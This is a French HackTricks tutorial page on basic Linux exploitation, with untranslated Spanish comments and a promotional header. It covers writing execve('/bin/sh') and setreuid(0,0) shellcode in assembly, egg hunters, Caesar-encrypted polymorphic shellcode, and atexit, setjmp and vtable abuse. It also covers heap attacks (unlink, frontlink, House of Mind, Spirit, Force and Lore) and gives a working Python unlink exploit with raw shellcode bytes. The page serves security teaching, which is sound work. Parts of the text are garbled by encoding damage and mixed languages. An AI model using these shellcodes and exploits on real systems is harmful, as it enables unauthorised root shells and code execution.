# Linux Exploiting (Basic) (FRA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** ‚Äî> Renvoie un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable form√© par le code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, un truc peut √™tre utilis√©. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons plac√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ en utilisant la pile (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature sp√©cifique dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Ce sont des shells chiffr√©es qui contiennent un petit code pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©thodes compl√©mentaires**





**Technique de Murat**

Sur linux, tous les programmes sont mapp√©s √† partir de 0xbfffffff.

En examinant comment la pile d'un nouveau processus est construite sur linux, il est possible de d√©velopper un exploit de sorte que le programme soit lanc√© dans un environnement o√π la seule variable est le shellcode. Son adresse peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_executable\_complet) - strlen(shellcode)

De cette mani√®re, l'adresse de la variable d'environnement contenant le shellcode peut √™tre obtenue facilement.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement n'ayant que les variables d'environnement souhait√©es.

##

###

###

###

###

### **Cha√Ænes de format pour les d√©bordements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e vers une variable. Par cons√©quent, il est possible d'abuser du formatage d'une cha√Æne pour provoquer un d√©passement de tampon dans la variable o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira 44B+"AAAA" dans la variable, ce qui peut provoquer un d√©passement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

`atexit()` est une fonction √† laquelle d'autres fonctions sont pass√©es en tant que param√®tres. Ces fonctions seront ex√©cut√©es lors de l'ex√©cution d'un `exit()` ou du retour au `main`.\
Si vous pouvez modifier l'adresse de l'une de ces fonctions pour pointer vers un shellcode par exemple, vous prendrez le contr√¥le du processus, mais c'est actuellement plus compliqu√©.\
Actuellement, les adresses des fonctions √† ex√©cuter sont cach√©es derri√®re plusieurs structures et finalement l'adresse vers laquelle elles pointent n'est pas celle des fonctions, mais elles sont chiffr√©es avec XOR et des d√©calages avec une cl√© al√©atoire. Ainsi, ce vecteur d'attaque n'est actuellement pas tr√®s utile, du moins sur x86 et x64\_86.\
La fonction de chiffrement est `PTR_MANGLE`. D'autres architectures telles que m68k, mips32, mips64, aarch64, arm, hppa... ne mettent pas en ≈ìuvre la fonction de chiffrement car elle renvoie la m√™me chose qu'elle a re√ßue en entr√©e. Ainsi, ces architectures pourraient √™tre attaqu√©es par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare d'exploiter cela**.
{% endhint %}

`Setjmp()` permet de **sauvegarder** le **contexte** (les registres)\
`longjmp()` permet de **restaurer** le **contexte**.\
Les registres sauvegard√©s sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Le probl√®me est que EIP et ESP sont pass√©s par la fonction `PTR_MANGLE`, donc les architectures vuln√©rables √† cette attaque sont les m√™mes que celles mentionn√©es ci-dessus.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, donc s'il y a un `call ebx`, `call esi` ou `call edi` √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **modification** du **VPtr** est r√©alis√©e, il pourrait √™tre **modifi√©** pour **pointer** vers une m√©thode factice de sorte qu'en ex√©cutant une fonction, le code malveillant soit atteint.

## **Mesures pr√©ventives et √©vasions**

###

**Remplacement de Libsafe**

Activ√© par : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√© (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas pour les compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD\_PRELOAD ne fonctionne pas sur les binaires avec suid).

**Espace d'adressage ASCII Armored**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne prot√®ge pas vraiment contre presque aucune attaque, surtout en little endian.

**ret2plt**

Consiste √† r√©aliser un ROP de sorte qu'on appelle la fonction strcpy@plt (de la plt) et qu'on pointe vers l'entr√©e de la GOT pour copier le premier octet de la fonction √† appeler (system()). Ensuite, on fait de m√™me en pointant vers GOT+1 et en copiant le 2√®me octet de system()... Enfin, on appelle l'adresse stock√©e dans la GOT qui sera system()

**Cages avec chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base dans un r√©pertoire sp√©cifique

Un administrateur peut sortir de ces cages en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de tas : Exploits de base**

**Bloc allou√©**

prev\_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Bloc libre**

prev\_size |\
size |\
\*fd | Ptr chunk suivant\
\*bk | Ptr chunk pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les blocs libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux blocs libres cons√©cutifs (ils sont fusionn√©s)

Dans "size", il y a des bits pour indiquer : si le bloc pr√©c√©dent est utilis√©, si le bloc a √©t√© allou√© via mmap() et si le bloc appartient √† l'ar√®ne principale.

Lorsqu'un bloc est lib√©r√© et que des blocs adjacents sont libres, ils sont fusionn√©s via la macro unlink() et le nouveau bloc le plus grand est pass√© √† frontlink() pour qu'il l'ins√®re dans le bon bin.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui qui √©tait libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui qui √©tait libre avant\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Ainsi, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ainsi, le shellcode s'ex√©cute √† la sortie du programme.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre ajust√© pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Ainsi, l'exploit est cr√©√© :

Dans le tampon1, nous ins√©rons le shellcode en commen√ßant par un jmp pour qu'il atteigne les nops ou le reste du shellcode.

Apr√®s le shellcode, nous ins√©rons du rembourrage jusqu'√† atteindre le champ prev\_size et size du bloc suivant. √Ä ces endroits, nous ins√©rons 0xfffffff0 (pour √©craser prev\_size et indiquer qu'il est libre) et "-4" (0xfffffffc) dans size (pour que lors de la v√©rification dans le 3√®me bloc si le 2√®me √©tait libre, il aille en r√©alit√© au prev\_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() v√©rifie, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me bloc est libre. Il appelle alors **unlink()**.
En appelant unlink(), P->fd utilisera les premi√®res donn√©es du 2√®me chunk, o√π l'adresse √† √©craser sera ins√©r√©e - 12 (car dans FD->bk, il ajoutera 12 √† l'adresse stock√©e dans FD). Et √† cette adresse, la deuxi√®me adresse trouv√©e dans le 2√®me chunk sera introduite, qui devrait √™tre l'adresse de la shellcode (P->bk faux).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de leur r√©servation.

Dans ce cas :

Dans le chunk c, nous pla√ßons la shellcode.

Nous utilisons le chunk a pour √©craser le b de mani√®re √† ce que la taille ait le bit PREV\_INUSE d√©sactiv√©, de sorte que le chunk a soit consid√©r√© comme libre.

De plus, nous √©crasons la taille dans l'en-t√™te b pour qu'elle soit de -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, donc il appellera unlink() pour le d√©tacher. Cependant, comme l'en-t√™te PREV\_SIZE vaut -4, il pensera que le chunk "a" commence r√©ellement √† b+4. Autrement dit, il fera un unlink() sur un chunk qui commence √† b+4, donc √† b+12 se trouvera le pointeur "fd" et √† b+16 se trouvera le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse de la shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre charge utile.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un √©l√©ment est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© mais frontlink() est appel√© directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon pouvant √™tre d√©bord√© avec la fonction de saisie de donn√©es.

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de l'en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent.

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent.

Un tampon d√©clar√© avant l'√©tape 3 qui permet de remplacer le prev\_size de celui-ci.

De cette mani√®re, en r√©ussissant √† √©craser deux mallocs de mani√®re incontr√¥l√©e et un de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons r√©aliser une exploitation.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on souhaite r√©utiliser l'un, il sera assign√© sans probl√®me. Si l'on souhaite utiliser l'autre, il se verra attribuer le m√™me espace, ce qui fausserait les pointeurs "fd" et "bk" avec les donn√©es √©crites par la r√©servation pr√©c√©dente.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Seule une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de rechercher un deuxi√®me chunk qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() appelle public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur √† l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON\_MAIN_ARENA, que l'on peut modifier pour que la v√©rification renvoie true et ex√©cute heap\_for\_ptr() qui effectue un "et" sur "mem", laissant les 2,5 octets les moins significatifs √† 0 (dans notre cas, de 0x0804a000, il laisse 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme s'il s'agissait d'une structure heap\_info).

De cette mani√®re, si nous pouvons contr√¥ler un chunk par exemple √† 0x0804a000 et qu'un chunk est sur le point d'√™tre lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me chunk est lib√©r√©, il constatera que heap\_for\_ptr(ptr)->ar\_ptr renvoie ce que nous avons √©crit √† 0x08100000 (car il applique l'op√©ration "et" que nous avons vue pr√©c√©demment et en extrait la valeur des 4 premiers octets, l'ar\_ptr).

Ainsi, \_int\_free(ar\_ptr, mem) est appel√©, c'est-√†-dire, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le chunk qui va √™tre lib√©r√©.

Comme unsorted\_chunks est d√©fini, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de \_\_DTOR\_END\_\_-12 dans av->bins\[2], √† la derni√®re instruction, l'adresse de ce premier chunk sera √©crite dans \_\_DTOR\_END\_\_.

En d'autres termes, au d√©but du premier chunk, nous devons mettre plusieurs fois l'adresse de \_\_DTOR\_END\_\_-12 car c'est de l√† que av->bins\[2] la r√©cup√©rera.

√Ä l'adresse o√π tombe l'adresse du deuxi√®me chunk avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier chunk pour que heap\_for\_ptr() pense que l'ar\_ptr est au d√©but du premier chunk et en extrait av->bins\[2].
Dans le deuxi√®me fragment, gr√¢ce au premier, nous √©crasons prev\_size avec un jump 0x0c et size avec quelque chose pour activer -> NON\_MAIN\_ARENA

Ensuite, dans le fragment 2, nous mettons beaucoup de nops et enfin le shellcode

Cela appellera \_int\_free(TROZO1, TROZO2) et suivra les instructions pour √©crire dans \_\_DTOR\_END\_\_ l'adresse de prev\_size de TROZO2 qui sautera vers le shellcode.

Pour appliquer cette technique, il est n√©cessaire de remplir quelques conditions suppl√©mentaires qui compliquent un peu plus la charge utile.

Cette technique n'est plus applicable car elle a √©t√© presque enti√®rement patch√©e comme pour unlink. On compare si le nouveau site point√© pointe √©galement vers lui.

**Fastbin**

C'est une variante de The house of mind

nous voulons ex√©cuter le code suivant qui est atteint apr√®s la premi√®re v√©rification de la fonction \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> O√π fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De cette mani√®re, si on le met dans "fb", cela donnera l'adresse d'une fonction dans la GOT, √† cette adresse sera plac√©e l'adresse du fragment √©cras√©. Pour cela, il sera n√©cessaire que l'ar√®ne soit proche des adresses des dtors. Plus pr√©cis√©ment, av->max\_fast doit √™tre √† l'adresse que nous allons √©craser.

Puisque avec The House of Mind, nous avons vu que nous contr√¥lions la position de av.

Donc, si nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE dans le champ size -> fastbin\_index() nous renverra fastbins\[-1], qui pointera vers av->max\_fast

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (pas celle point√©e, mais cette position sera √©cras√©e).

De plus, il faut que le fragment contigu au fragment lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du fragment lib√©r√© est de 8, dans ce faux fragment, nous devons simplement mettre une taille sup√©rieure √† 8 (comme en plus le shellcode sera dans le fragment lib√©r√©, nous devrons mettre au d√©but un jmp qui tombe dans les nops).

De plus, ce m√™me faux fragment doit √™tre plus petit que av->system\_mem. av->system\_mem est situ√© √† 1848 octets plus loin.

En raison des z√©ros de \_DTOR\_END\_ et des quelques adresses dans la GOT, aucune de ces adresses de ces sections ne convient pour √™tre √©cras√©e, donc voyons comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque consiste √† rediriger **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8 alors : fastbin\_index() nous renverra fastbins\[0] et nous pouvons utiliser cela pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni de valeurs √©tranges dans la pile, en fait nous devons nous trouver dans celle-ci : 4 octets nuls + EBP + RET

Les 4 octets nuls sont n√©cessaires pour que **av** soit √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

**av->max\_fast** sera l'EBP et sera une valeur qui nous permettra de contourner les restrictions.

Dans **av->fastbins\[0]** sera √©cras√© avec l'adresse de **p** et sera le RET, ainsi il sautera vers le shellcode.

De plus, dans **av->system\_mem** (1484 octets au-dessus de la position dans la pile) il y aura suffisamment de d√©chets qui nous permettront de contourner la v√©rification effectu√©e.

De plus, il faut que le fragment contigu au fragment lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du fragment lib√©r√© est de 16, dans ce faux fragment, nous devons simplement mettre une taille sup√©rieure √† 8 (comme en plus le shellcode sera dans le fragment lib√©r√©, nous devrons mettre au d√©but un jmp qui tombe dans les nops qui viennent apr√®s le champ size du nouveau faux fragment).

**The House of Spirit**

Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre modifi√© par l'attaquant (par exemple, le pointeur est sur la pile sous un √©ventuel d√©bordement d'une variable).

Ainsi, nous pourrions faire pointer ce pointeur o√π nous voulons. Cependant, n'importe quel endroit n'est pas valide, la taille du faux fragment doit √™tre inf√©rieure √† av->max\_fast et plus sp√©cifiquement √©gale √† la taille demand√©e dans un futur appel √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable, un malloc(40) est appel√©, la taille du faux fragment doit √™tre √©gale √† 48.

Par exemple, si le programme demande un nombre √† l'utilisateur, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable vers les 4 octets suivants (qui pourraient appartenir √† l'EBP avec un peu de chance, ainsi le 48 reste derri√®re, comme s'il s'agissait de l'en-t√™te size). De plus, l'adresse ptr-4+48 doit remplir plusieurs conditions (dans ce cas ptr=EBP), c'est-√†-dire, 8 < ptr-4+48 < av->system\_mem.

Si cela est vrai, lorsque le prochain malloc est appel√©, qui √©tait malloc(40), l'adresse du EBP lui sera assign√©e. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois l'EBP et l'EIP avec l'adresse qu'il souhaite.

Cela est d√ª au fait que lorsque free() est appel√©, il enregistre que l'adresse point√©e par l'EBP de la pile contient un fragment de taille parfaite pour le nouveau malloc() √† r√©server, il lui attribue donc cette adresse.

**The House of Force**

Il est n√©cessaire de :

* Un d√©bordement sur un fragment qui permet de remplacer le wilderness
* Un appel √† malloc() avec la taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est de remplacer la taille du fragment wilderness par une valeur tr√®s grande (0xffffffff), de sorte que toute demande de m√©moire suffisamment grande sera trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La deuxi√®me √©tape consiste √† modifier av->top pour qu'il pointe vers une zone de m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, on mettra \&EIP - 8.

Nous devons remplacer av->top pour qu'il pointe vers la zone de m√©moire sous le contr√¥le de l'attaquant :

victime = av->top;

reste = chunck\_at\_offset(victime, nb);

av->top = reste;

Victime r√©cup√®re la valeur de l'adresse du fragment wilderness actuel (l'actuel av->top) et reste est exactement la somme de cette adresse plus la quantit√© d'octets demand√©e par malloc(). Ainsi, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur modifi√©e sera enregistr√©e dans av->top et le prochain malloc pointera vers l'EIP et pourra l'√©craser.

Il est important de savoir que la taille du nouveau fragment wilderness soit plus grande que la demande faite par le dernier malloc(). Autrement dit, si le wilderness pointe vers \&EIP-8, la taille sera juste dans le champ EBP de la pile.

**The House of Lore**

**Corruption SmallBin**

Les fragments lib√©r√©s sont plac√©s dans le bin en fonction de leur taille. Mais avant d'√™tre plac√©s, ils sont stock√©s dans unsorted bins. Lorsqu'un fragment est lib√©r√©, il n'est pas imm√©diatement plac√© dans son bin mais reste dans unsorted bins. Ensuite, s'il est demand√© un nouveau fragment et que le fragment pr√©c√©demment lib√©r√© peut √™tre utilis√©, il est renvoy√©, mais s'il est demand√© un fragment plus grand, le fragment lib√©r√© dans unsorted bins est plac√© dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire doit √™tre sup√©rieure √† av->max\_fast (72 normalement) et inf√©rieure √† MIN\_LARGE\_SIZE (512).
Si dans les bins il y a un morceau de la taille demand√©e, il est renvoy√© apr√®s avoir √©t√© d√©tach√© :

bck = victim->bk; Pointe vers le morceau pr√©c√©dent, c'est la seule information que nous pouvons alt√©rer.

bin->bk = bck; Le dernier morceau devient l'avant-dernier, si bck pointe vers le stack au morceau suivant r√©serv√©, cette adresse lui sera donn√©e.

bck->fd = bin; La liste est ferm√©e en faisant pointer ceci vers bin

Il est n√©cessaire de :

- R√©server deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le deuxi√®me ait √©t√© lib√©r√© et introduit dans son bin (c'est-√†-dire qu'un malloc sup√©rieur au deuxi√®me morceau ait √©t√© r√©serv√© avant le d√©bordement)
- Que le malloc r√©serv√© √† l'adresse choisie par l'attaquant soit contr√¥l√© par l'attaquant.

L'objectif est le suivant : si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons alt√©rer son pointeur bk. Si nous alt√©rons son pointeur bk et que ce morceau devient le premier de la liste du bin et est r√©serv√©, le bin sera tromp√© et on lui dira que le dernier morceau de la liste (le suivant √† offrir) est √† l'adresse fausse que nous avons sp√©cifi√©e (par exemple, le stack ou la GOT). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des permissions dessus, un morceau sera donn√© √† l'adresse souhait√©e et il pourra √©crire dedans.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui lib√©r√©, de sorte que le morceau modifi√© sorte des bins non tri√©s et soit introduit dans son bin.

Une fois dans son bin, il est temps de modifier son pointeur bk via le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit r√©utilis√© et trompe le bin en lui faisant croire que le morceau suivant est √† l'adresse fausse. Ensuite, le morceau qui nous int√©resse sera donn√©.

